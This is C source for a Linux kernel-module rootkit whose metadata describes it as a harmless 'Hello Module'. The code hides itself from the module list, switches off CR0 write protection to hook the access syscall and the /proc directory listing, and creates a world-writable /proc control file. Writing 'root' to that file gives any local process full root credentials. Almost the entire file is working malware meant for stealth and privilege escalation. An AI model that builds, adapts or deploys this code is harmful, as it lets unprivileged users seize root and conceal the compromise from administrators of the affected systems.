#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/list.h>
#include <linux/syscalls.h>
#include <linux/random.h>
#include <linux/proc_fs.h>
#include <linux/namei.h>

#include "rootkit.h"

// Static variables

static u8 module_hidden = 0;

static struct list_head *module_list;

static struct proc_dir_entry *proc_rootkit;

// Vars for proc manipulation
int (*orig_iterate_shared)(struct file *, struct dir_context *);
int (*orig_filldir)(struct dir_context *, const char *, int, loff_t, u64,
                    unsigned);

// Vars for syscall hijacking
static unsigned long *syscall_table;

typedef asmlinkage long (*sys_call_ptr_t)(const struct pt_regs *);
static sys_call_ptr_t orig_access;

// Module hiding

void module_hide(void)
{
    if (module_hidden)
        return;
    module_list = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    module_hidden = 1;
}

void module_unhide(void)
{
    if (!module_hidden)
        return;
    list_add(&THIS_MODULE->list, module_list);
    module_hidden = 0;
}

// https://stackoverflow.com/a/60564037
static inline void force_write_cr0(unsigned long cr0)
{
    asm volatile("mov %0, %%cr0"
                 : "+r"(cr0), "+m"(__force_order));
}

static inline void disable_write_protect(void)
{
    unsigned long cr0 = read_cr0();
    clear_bit(16, &cr0);
    force_write_cr0(cr0);
}

static inline void enable_write_protect(void)
{
    unsigned long cr0 = read_cr0();
    set_bit(16, &cr0);
    force_write_cr0(cr0);
}

unsigned long *find_syscall_table(void)
{
    return (unsigned long *)kallsyms_lookup_name("sys_call_table");
}

asmlinkage long rk_access(const struct pt_regs *pt_regs)
{
    const char __user *filename = (const char __user *)pt_regs->di;
    int mode = (int)pt_regs->si;
    pr_info("Access: %s\n", filename);
    return orig_access(pt_regs);
}

// Proc file interface

static ssize_t rk_proc_read(struct file *file, char __user *ubuf, size_t count, loff_t *ppos)
{
    return 0;
}

static ssize_t rk_proc_write(struct file *file, const char __user *ubuf, size_t count, loff_t *ppos)
{
    if (strncmp(ubuf, "toggle", MIN(6, count)) == 0)
    {
        if (module_hidden)
            module_unhide();
        else
            module_hide();
    }
    else if (strncmp(ubuf, "root", MIN(4, count)) == 0)
    {
        struct cred *creds = prepare_creds();
        if (creds != NULL)
        {
            creds->uid.val = 0;
            creds->gid.val = 0;
            creds->euid.val = 0;
            creds->egid.val = 0;
        }
        commit_creds(creds);
    }
    return count;
}

static int rk_filldir(struct dir_context *ctx, const char *proc_name, int len,
                      loff_t off, u64 ino, unsigned int d_type)
{
    if (module_hidden && (strncmp(proc_name, PROCFILE_NAME, strlen(PROCFILE_NAME) - 1) == 0))
        return 0;
    return orig_filldir(ctx, proc_name, len, off, ino, d_type);
}

int rk_iterate_shared(struct file *file, struct dir_context *ctx)
{
    orig_filldir = ctx->actor;
    *(filldir_t *)&ctx->actor = rk_filldir;
    return orig_iterate_shared(file, ctx);
}

static const struct file_operations proc_rootkit_fops = {
    .read = rk_proc_read,
    .write = rk_proc_write,
};

static int proc_init(void)
{
    struct inode *proc_inode;
    struct path proc_path;

    // Create entry for controlling rootkit
    proc_rootkit = proc_create(PROCFILE_NAME, S_IRUGO | S_IWUGO, NULL, &proc_rootkit_fops);
    if (!proc_rootkit)
        return -1;

    if (kern_path("/proc", 0, &proc_path))
        return -1;

    proc_inode = proc_path.dentry->d_inode; // Get inode of proc
    orig_iterate_shared = proc_inode->i_fop->iterate_shared;
    disable_write_protect();
    ((struct file_operations *)proc_inode->i_fop)->iterate_shared = rk_iterate_shared;
    enable_write_protect();

    return 0;
}

static void proc_clean(void)
{
    struct inode *proc_inode;
    struct path proc_path;

    if (proc_rootkit != NULL)
    {
        proc_remove(proc_rootkit);
        proc_rootkit = NULL;
    }

    if (kern_path("/proc", 0, &proc_path))
        return;
    proc_inode = proc_path.dentry->d_inode;
    disable_write_protect();
    ((struct file_operations *)proc_inode->i_fop)->iterate_shared = orig_iterate_shared;
    enable_write_protect();
}

static int __init lkm_rootkit_init(void)
{
    printk(KERN_INFO "Hello, World!\n");

    if (proc_init())
    {
        proc_clean();
        return 1;
    }

    module_hide();

    syscall_table = find_syscall_table();
    pr_info("Found syscall_table at %lx\n", *syscall_table);

    orig_access = (sys_call_ptr_t)syscall_table[__NR_access];

    disable_write_protect();

    syscall_table[__NR_access] = (unsigned long)rk_access;

    enable_write_protect();

    return 0;
}

static void __exit lmk_rootkit_exit(void)
{
    proc_clean();

    disable_write_protect();

    syscall_table[__NR_access] = (unsigned long)orig_access;

    enable_write_protect();

    printk(KERN_INFO "Goodbye, World!\n");
}

module_init(lkm_rootkit_init);
module_exit(lmk_rootkit_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Thomas");
MODULE_DESCRIPTION("Hello Module");
MODULE_VERSION("0.0.1");